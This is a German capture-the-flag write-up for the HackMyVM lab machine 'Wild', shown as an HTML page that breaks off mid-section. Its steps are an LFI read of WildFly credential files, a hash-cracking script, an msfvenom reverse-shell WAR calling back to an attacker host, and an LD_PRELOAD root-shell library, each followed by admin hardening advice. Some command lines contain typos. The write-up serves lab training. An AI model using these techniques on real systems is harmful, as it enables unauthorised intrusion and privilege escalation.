@@ -1,0 +1,696 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wild - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Wild - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi / nano</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">msfvenom</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">hashlib (Python)</div>
+                <div class="tool-item">requests (Python)</div>
+                <div class="tool-item">cPickle (Python)</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">mkpasswd</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">fg</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">bash</div>
+             </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#service-enumeration">Service Enumeration</a>
+                    <ul>
+                        <li><a href="#enum-http80">Port 80 (Apache)</a></li>
+                        <li><a href="#enum-wildfly">Ports 8080, 8443, 9990 (WildFly/JBoss)</a></li>
+                        <li><a href="#enum-lfi">Local File Inclusion (LFI) auf Port 80</a></li>
+                    </ul>
+                </li>
+                 <li><a href="#initial-access">Initial Access (POC - WildFly WAR Deployment)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (POC - Sudo Info/LD_PRELOAD)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.111	08:00:27:2d:52:01	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerk zu finden. Ein Host mit der IP `192.168.2.111` wird entdeckt. Die MAC-Adresse (`08:00:27:2d:52:01`) gehört zum OUI von "PCS Systemtechnik GmbH", was auf eine VirtualBox-VM hindeutet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich lokalisiert. Die IP `192.168.2.111` wird für die weiteren Scans verwendet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nmap-Scan auf die IP `192.168.2.111` durchführen.<br>
+                **Empfehlung (Admin):** Netzwerk-Monitoring implementieren, um unbekannte Geräte zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+<span class="comment"># Eintrag hinzugefügt:</span>
+[...]
+<span class="command">192.168.2.111   wild.hmv</span>
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der Hostname `wild.hmv` wird der lokalen `/etc/hosts`-Datei des Angreifers hinzugefügt und auf die IP-Adresse des Zielsystems `192.168.2.111` gemappt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Standardvorgehen, um das Zielsystem über seinen Hostnamen ansprechen zu können, was für Webanwendungen oder zur besseren Lesbarkeit nützlich ist.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 23:19 CEST
+Nmap scan report for wild.hmv (<span class="command">192.168.2.111</span>)
+Host is up (0.00022s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+<span class="command">22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| ssh-hostkey: [...]
+<span class="command">80/tcp   open  http          Apache httpd 2.4.57 ((Debian))</span>
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: burger html5 landing page
+<span class="command">8080/tcp open  http-proxy</span> <span class="comment"># Nmap erkennt als Proxy, ist aber WildFly</span>
+|_http-open-proxy: Proxy might be redirecting requests
+[...]
+|_http-title: Welcome to WildFly
+<span class="command">8443/tcp open  ssl/https-alt</span> <span class="comment"># WildFly HTTPS</span>
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Welcome to WildFly
+| ssl-cert: Subject: commonName=localhost [...]
+| tls-alpn: |_  http/1.1
+[...]
+<span class="command">9990/tcp open  osm-appsrvr?</span> <span class="comment"># WildFly Management Console</span>
+| fingerprint-strings:
+[...]
+|   GetRequest:
+|     HTTP/1.1 302 Found
+|     Connection: close
+|     Location: /console/index.html
+[...]
+MAC Address: 08:00:27:2D:52:01 (Oracle VirtualBox virtual NIC)
+[...]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Ein detaillierter Nmap-Scan (`-sS -sV -A -T5 -p-`) auf `wild.hmv` (192.168.2.111) identifiziert fünf offene TCP-Ports:
+                 *   **Port 22 (SSH):** OpenSSH 9.2p1 (Debian).
+                 *   **Port 80 (HTTP):** Apache 2.4.57 (Debian). Zeigt eine Webseite mit dem Titel "burger html5 landing page".
+                 *   **Port 8080 (HTTP):** Von Nmap als `http-proxy` erkannt, aber die Fingerprints und der Titel "Welcome to WildFly" deuten klar auf den Standard-HTTP-Port des WildFly/JBoss Application Servers hin.
+                 *   **Port 8443 (HTTPS):** Ebenfalls WildFly, diesmal über SSL/TLS. Das Zertifikat ist für `localhost` ausgestellt.
+                 *   **Port 9990 (Unknown):** Von Nmap als `osm-appsrvr?` fehlinterpretiert. Die HTTP-Antwort (302 Redirect auf `/console/index.html`) identifiziert dies eindeutig als den WildFly Management Console Port.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Hauptangriffsvektoren sind:
+                 *   **Apache (Port 80):** Eine Landingpage, die weiter untersucht werden muss (Verzeichnisse, Dateien, Schwachstellen).
+                 *   **WildFly (Ports 8080, 8443, 9990):** WildFly/JBoss ist bekannt für eine Vielzahl von Schwachstellen, insbesondere in älteren Versionen oder bei unsicherer Konfiguration (Default Credentials, unsichere Deployments, verwundbare Management-Schnittstelle). Port 9990 (Management Console) ist besonders interessant.
+                 *   **SSH (Port 22):** Benötigt Credentials.
+             </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):**
+                 1.  **Apache (Port 80):** Mit `gobuster`/`dirb`/`nikto` untersuchen. Quellcode analysieren. Besonderes Augenmerk auf die gefundenen PHP-Dateien legen.
+                 2.  **WildFly (8080, 8443, 9990):**
+                     *   Standard-Credentials für die Management Console (9990) testen (z.B. `admin:admin`, `admin:password`, etc.).
+                     *   Mit Tools wie `jboss-autopwn` oder Metasploit-Modulen nach bekannten Schwachstellen suchen.
+                     *   Die auf 8080/8443 bereitgestellte Anwendung untersuchen.
+                 3.  **SSH:** Zurückstellen.<br>
+                 **Empfehlung (Admin):**
+                 1.  **Apache:** Sicher konfigurieren, nicht benötigte Module deaktivieren. Webanwendung aktuell halten und auf Schwachstellen prüfen.
+                 2.  **WildFly:** Aktuell halten (Patches!). Den Zugriff auf die Management Console (Port 9990) und die Anwendungsserver-Ports (8080/8443) stark einschränken (Firewall, nur Admin-Netzwerk). Starke, nicht-standardmäßige Passwörter für die Management Console verwenden. Unsichere Deployments entfernen.
+                 3.  **SSH:** Standard-Härtung.
+             </p>
+        </section>
+
+        <section id="service-enumeration">
+            <h2>Service Enumeration</h2>
+
+            <h3 id="enum-http80">Port 80 (Apache)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.111</span></div>
+                      <pre>
+- Nikto v2.5.0
+[...]
++ Server: Apache/2.4.57 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found [...]
++ /: Web Server returns a valid response with junk HTTP methods [...]
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
++ /images/: Directory indexing found.
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `nikto` wird auf Port 80 ausgeführt. Es findet den Apache-Server, meldet fehlende Sicherheitsheader und Directory Indexing für `/css/` und `/images/`. Keine kritischen Schwachstellen werden direkt gefunden.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Bestätigt Standard-Konfigurationsschwächen. Directory Indexing könnte nützlich sein, ist aber oft nicht kritisch.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://wild.hmv -x txt,php,[...] -w "/usr/share/seclists/[...]" -b '403,404' -e --no-error -k</span></div>
+                      <pre>
+[...]
+http://wild.hmv/index.php            (Status: 200) [Size: 19390]
+http://wild.hmv/images               (Status: 301) [Size: 305] [--> http://wild.hmv/images/]
+<span class="command">http://wild.hmv/about.php</span>            (Status: 200) [Size: 3]
+http://wild.hmv/css                  (Status: 301) [Size: 302] [--> http://wild.hmv/css/]
+http://wild.hmv/js                   (Status: 301) [Size: 301] [--> http://wild.hmv/js/]
+http://wild.hmv/fonts                (Status: 301) [Size: 304] [--> http://wild.hmv/fonts/]
+<span class="command">http://wild.hmv/recipe.php</span>           (Status: 200) [Size: 2092]
+<span class="command">fatty-burger.php</span>                   (Status: 200) [Size: 2104] <span class="comment"># Pfad relativ?</span>
+<span class="command">shack-burger.php</span>                   (Status: 200) [Size: 2069] <span class="comment"># Pfad relativ?</span>
+<span class="command">cheddar-burger.php</span>                 (Status: 200) [Size: 2008] <span class="comment"># Pfad relativ?</span>
+[...]
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://192.168.2.111</span></div>
+                     <pre>
+[...]
+==> DIRECTORY: http://192.168.2.111/images/
+==> DIRECTORY: http://192.168.2.111/css/
+==> DIRECTORY: http://192.168.2.111/fonts/
++ http://192.168.2.111/index.php (CODE:200|SIZE:19390)
+==> DIRECTORY: http://192.168.2.111/js/
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `gobuster` und `dirb` finden die Hauptseite (`index.php`), Standardverzeichnisse (`images`, `css`, `js`, `fonts`) und mehrere PHP-Dateien: `about.php`, `recipe.php`, `fatty-burger.php`, `shack-burger.php`, `cheddar-burger.php`. Die Burger-PHP-Dateien scheinen im Root-Verzeichnis zu liegen. `about.php` ist sehr klein (3 Bytes).
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Die Datei `recipe.php` ist am interessantesten, da sie auf eine Funktionalität hindeutet, die über eine reine Anzeige hinausgeht. Die Burger-PHP-Dateien könnten mit `recipe.php` zusammenhängen.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Die Datei `recipe.php` manuell im Browser aufrufen und auf Parameter oder Interaktionsmöglichkeiten prüfen. Den Quellcode untersuchen, falls möglich (z.B. über LFI).<br>
+                **Empfehlung (Admin):** Sicherstellen, dass alle PHP-Skripte sicher programmiert sind und keine Schwachstellen wie LFI oder RCE enthalten. Nicht benötigte Skripte entfernen.
+            </p>
+
+             <h3 id="enum-wildfly">Ports 8080, 8443, 9990 (WildFly/JBoss)</h3>
+              <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">Manuelle Prüfung von http://wild.hmv:8080/</span>
+<span class="comment"><!-- [...] --></span>
+<title>Welcome to WildFly</title>
+<span class="comment"><!-- [...] --></span>
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://wild.hmv:8080 -w [...] -k -t 50</span></div> <span class="comment"># Gekürzt</span>
+                     <pre>
+[...]
+/index.html           (Status: 200) [Size: 1590]
+/console              (Status: 302) [Size: 0] [--> http://wild.hmv:9990/console]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Die Untersuchung von Port 8080 zeigt die WildFly-Standard-Willkommensseite. `gobuster` findet einen Redirect von `/console` auf die Management-Konsole auf Port 9990.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Bestätigt, dass Port 8080 die Standard-WildFly-Seite ist und 9990 der Management-Port.
+             </p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole -q</span></div>
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use auxiliary/scanner/http/jboss_vulnscan</span></div>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jboss_vulnscan) > <span class="command">set RHSTS wild.hmv</span></div>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jboss_vulnscan) > <span class="command">set RPORT 8080</span></div>
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/http/jboss_vulnscan) > <span class="command">run</span></div>
+                     <pre>
+[*] 192.168.2.111:8080 Fingerprint:
+[*] 192.168.2.111:8080 Checking http...
+[*] 192.168.2.111:8080 /jmx-console/HtmlAdaptor not found (404)
+[*] 192.168.2.111:8080 /jmx-console/checkJNDI.jsp not found (404)
+[*] 192.168.2.111:8080 /status not found (404)
+[*] 192.168.2.111:8080 /web-console/ServerInfo.jsp not found (404)
+[*] 192.168.2.111:8080 /web-console/Invoker not found (404)
+[*] 192.168.2.111:8080 /invoker/JMXInvokerServlet not found (404)
+[*] 192.168.2.111:8080 /invoker/readonly not found (404)
+[*] 192.168.2.111:8080 Checking for JBoss AS default creds
+[*] 192.168.2.111:8080 Could not guess admin credentials
+[*] 192.168.2.111:8080 Checking services...
+[*] 192.168.2.111:8080 Naming Service tcp/1098: closed
+[*] 192.168.2.111:8080 Naming Service tcp/1099: closed
+[*] 192.168.2.111:8080 RMI invoker tcp/4444: closed
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Das Metasploit-Modul `jboss_vulnscan` wird auf Port 8080 ausgeführt. Es findet keine der bekannten, häufig ausgenutzten JBoss/WildFly-Schnittstellen (`/jmx-console`, `/web-console/Invoker`, etc.) und kann auch keine Standard-Credentials erraten.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Die "üblichen Verdächtigen" für JBoss/WildFly RCE scheinen nicht vorhanden oder nicht zugänglich zu sein. Die Management-Konsole auf Port 9990 muss genauer untersucht werden.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">Manuelle Prüfung von http://wild.hmv:9990/console/index.html</span>
+HAL Management Console
+Access Provider Error
+Status 401 - Unauthorized.
+[...]
+                    </pre>
+                     <pre>
+# <span class="command">Gobuster auf Port 9990 (impliziert)</span>
+http://wild.hmv:9990/health               (Status: 200) [Size: 365]
+http://wild.hmv:9990/management           (Status: 401) [Size: 77]
+http://wild.hmv:9990/logout               (Status: 307) [...]
+http://wild.hmv:9990/error                (Status: 302) [Size: 0] [--> /error/index.html]
+http://wild.hmv:9990/console              (Status: 302) [Size: 0] [--> /console/index.html]
+http://wild.hmv:9990/metrics              (Status: 200) [Size: 34938]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Der Zugriff auf die Management-Konsole (`/console/index.html`) auf Port 9990 erfordert Authentifizierung (401). `gobuster` findet einige Endpunkte: `/health` und `/metrics` sind ohne Authentifizierung zugänglich, `/management` erfordert welche.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Der Zugriff auf die Management-Konsole ist geschützt. Credentials werden benötigt. Die `/health`- und `/metrics`-Endpunkte könnten Informationen preisgeben, sind aber meist weniger kritisch.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Versuchen, Credentials für die Management-Konsole zu finden, z.B. durch Ausnutzung der LFI auf Port 80, um Konfigurationsdateien von WildFly zu lesen.<br>
+                 **Empfehlung (Admin):** Zugriff auf Port 9990 stark einschränken. Starke Passwörter verwenden. WildFly aktuell halten.
+             </p>
+
+             <h3 id="enum-lfi">Local File Inclusion (LFI) auf Port 80</h3>
+             <p class="analysis">
+                 **Analyse:** Aus den Notizen geht hervor, dass die Datei `recipe.php` (gefunden auf Port 80) für LFI anfällig ist. Der Parameter ist `file`.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">Auslesen von /opt/wildfly/domain/configuration/mgmt-users.properties via LFI</span>
+# curl 'http://wild.hmv/recipe.php?file=php://filter/convert.base64-encode/resource=/opt/wildfly/domain/configuration/mgmt-users.properties'
+
+<span class="password"># Base64 dekodiert:</span>
+#
+# Properties declaration of users for the realm 'ManagementRealm' [...]
+# username=HEX( MD5( username ':' realm ':' password))
+# [...]
+<span class="password">administrator=3bfa7f34174555fe766d0e0295821742</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Mittels LFI und dem `php://filter`-Wrapper wird die Datei `/opt/wildfly/domain/configuration/mgmt-users.properties` ausgelesen und Base64-dekodiert. Sie enthält den Benutzernamen `administrator` und einen Hash (`3bfa7f34174555fe766d0e0295821742`). Der Kommentar in der Datei erklärt das Hash-Format: `MD5(username:realm:password)`. Der Standard-Realm ist `ManagementRealm`.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Kritischer Fund! Der Benutzername und der Passwort-Hash für die WildFly Management Console wurden extrahiert. Der Hash kann nun offline geknackt werden.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den Hash `3bfa7f34174555fe766d0e0295821742` mit dem Format `MD5(administrator:ManagementRealm:<password>)` versuchen zu knacken.<br>
+                 **Empfehlung (Admin):** Die LFI-Schwachstelle in `recipe.php` beheben. WildFly so konfigurieren, dass Konfigurationsdateien nicht vom Webserver-Prozess gelesen werden können.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Hash Cracking Script -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi hashcracker.py</span></div>
+                     <pre>
+#!/usr/bin/python3
+import hashlib
+
+username="administrator"
+realm="ManagementRealm"
+hash_re="3bfa7f34174555fe766d0e0295821742"
+with open("/usr/share/wordlists/rockyou.txt",'r',errors="ignore") as file:
+    for passwd in file:
+        passwd=passwd.strip()
+        # Korrektur: Klammerung und f-string-Syntax im Original-Log fehlerhaft
+        md5_hash = hashlib.md5(f"{username}:{realm}:{passwd}".encode()).hexdigest()
+        if md5_hash == hash_re:
+            print(passwd)
+            break
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 hashcracker.py</span></div>
+                      <pre><span class="password">katarina9</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Ein Python-Skript wird verwendet, um den MD5-Hash zu knacken. Es iteriert durch die `rockyou.txt`-Liste, bildet den String `administrator:ManagementRealm:<password>`, berechnet dessen MD5-Hash und vergleicht ihn mit dem Zielhash. Das Skript findet erfolgreich das Passwort `katarina9`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das Passwort für den WildFly-Administrator wurde geknackt.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Sich mit `administrator:katarina9` an der WildFly Management Console (`http://wild.hmv:9990/`) anmelden.<br>
+                 **Empfehlung (Admin):** Das Passwort für den WildFly-Administrator ändern. Starke Passwörter verwenden. Die LFI beheben.
+             </p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (POC - WildFly WAR Deployment)</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">Login an http://wild.hmv:9990/console/index.html mit administrator:katarina9</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Login in die WildFly Management Console ist erfolgreich.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfvenom -p java/jsp_shell_reverse_tcp LHST=192.168.2.199 LPRT=5555 -f war > tao.war</span></div>
+                    <pre>
+Payload size: 1096 bytes
+Final size of war file: 1096 bytes
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `msfvenom` wird verwendet, um eine Java-Reverse-Shell (`java/jsp_shell_reverse_tcp`) als WAR-Datei (`tao.war`) zu erstellen. Der Listener wird auf `192.168.2.199:5555` konfiguriert. *Anmerkung: Erneut eine andere Angreifer-IP (`.199`) als zuvor (`.153`).*
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Eine bösartige Webanwendung (WAR-Datei) ist bereit für das Deployment über die WildFly-Konsole.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">Deployment von tao.war über die WildFly Management Console</span>
+# Navigieren zu Deployments -> Add -> Upload new deployment -> tao.war auswählen -> Next -> Enable
+# Details der erfolgreichen Bereitstellung:
+Deployment (1)
+    <span class="command">tao.war</span>
+tao.war
+The deployment tao.war is enabled and active. Disable
+Main Attributes
+    Name: tao.war
+    Runtime Name: tao.war
+    <span class="command">Context Root: /tao</span>
+    [...]
+    Status: OK
+[...]
+                     </pre>
+                 </div>
+            </div>
+              <p class="analysis">
+                 **Analyse:** Die erstellte `tao.war`-Datei wird über die Web-Oberfläche der WildFly Management Console hochgeladen und bereitgestellt (deployed). Das Deployment ist erfolgreich und die Anwendung ist unter dem Context Root `/tao` aktiv.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Backdoor ist nun auf dem Server aktiv und wartet darauf, ausgelöst zu werden. Dies ist eine Standardmethode zur Kompromittierung von Application Servern mit Management-Zugang.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>listening on [any] 5555 ...</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.111:8080/tao/</span></div> <span class="comment"># Trigger</span>
+                      <!-- Ausgabe im Listener -->
+                     <pre>
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 40676</span>
+<span class="command">id</span>
+<span class="command">uid=1002(tod) gid=1002(tod) groups=1002(tod),100(users)</span> <span class="comment"># Shell als Benutzer 'tod'!</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Ein Netcat-Listener wird auf Port 5555 gestartet. Die URL der bereitgestellten WAR-Anwendung (`http://192.168.2.111:8080/tao/`) wird mit `curl` aufgerufen. Dies löst den JSP-Shell-Payload aus. Der Listener empfängt eine Verbindung vom Zielserver. Der `id`-Befehl zeigt, dass die Shell als Benutzer `tod` (UID 1002) läuft. Dies ist wahrscheinlich der Benutzer, unter dem der WildFly-Prozess ausgeführt wird.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Initial Access erfolgreich als Benutzer `tod` erlangt.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Shell stabilisieren und Enumeration als `tod` beginnen.<br>
+                 **Empfehlung (Admin):** Zugriff auf die WildFly Management Console absichern. WildFly mit einem dedizierten Benutzer mit minimalen Rechten ausführen, nicht als potenziell privilegierten Benutzer. WAR-Deployments nur aus vertrauenswürdigen Quellen zulassen.
+             </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (POC - Sudo Info/LD_PRELOAD)</h2>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Innerhalb der 'tod' Shell -->
+                     <div class="prompt">tod@wild:/opt/wildfly/bin$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for tod on wild:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User tod may run the following commands on wild:
+    <span class="command">(ALL : ALL) SETENV: NPASSWD: /usr/bin/info</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `sudo -l` als Benutzer `tod` zeigt, dass dieser den Befehl `/usr/bin/info` als root (`ALL : ALL`) ohne Passwort (`NOPASSWD`) ausführen darf. Wichtig ist auch die `SETENV`-Option, die das Setzen von Umgebungsvariablen (wie `LD_PRELOAD`) erlaubt.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Dies ist ein klarer PrivEsc-Vektor über `LD_PRELOAD`. Da `info` ausgeführt wird und Umgebungsvariablen gesetzt werden dürfen, kann eine bösartige Shared Library (`.so`-Datei) erstellt und über `LD_PRELOAD` geladen werden, wenn `info` mit `sudo` gestartet wird. Der Code in der Library wird dann mit Root-Rechten ausgeführt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Eine C-Datei erstellen, die eine `_init`-Funktion enthält, welche `setuid(0)`, `setgid(0)` aufruft und eine Root-Shell (`/bin/bash -p`) startet.
+                2.  Diese Datei zu einer Shared Library (`.so`) kompilieren.
+                3.  Die `.so`-Datei auf das Zielsystem übertragen.
+                4.  Den `sudo`-Befehl mit gesetzter `LD_PRELOAD`-Variable ausführen: `sudo LD_PRELOAD=/pfad/zur/boesen.so /usr/bin/info`.<br>
+                **Empfehlung (Admin):** Die `sudo`-Regel für `info` entfernen. Niemals erlauben, dass Benutzer `sudo` mit der `SETENV`-Option für Befehle verwenden, die zum Laden von Libraries oder Ausführen weiterer Befehle missbraucht werden können. Die `NOPASSWD`-Option nur extrem restriktiv verwenden.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Erstellen der bösartigen Library auf Angreifer-Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat infohack.c</span></div>
+                     <pre>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD"); <span class="comment"># Wichtig, um Endlosschleifen zu vermeiden</span>
+    setgid(0);
+    setuid(0);
+    system("/bin/bash -p"); <span class="comment"># Startet root shell</span>
+}
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gcc -fPIC -shared -o infohack.so infohack.c -nostartfiles</span></div>
+                      <pre>
+infohack.c: In function ‘_init’:
+infohack.c:7:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    7 |     setgid(0);
+      |     ^~~~~~
+infohack.c:8:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    8 |     setuid(0);
+      |     ^~~~~~
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis">
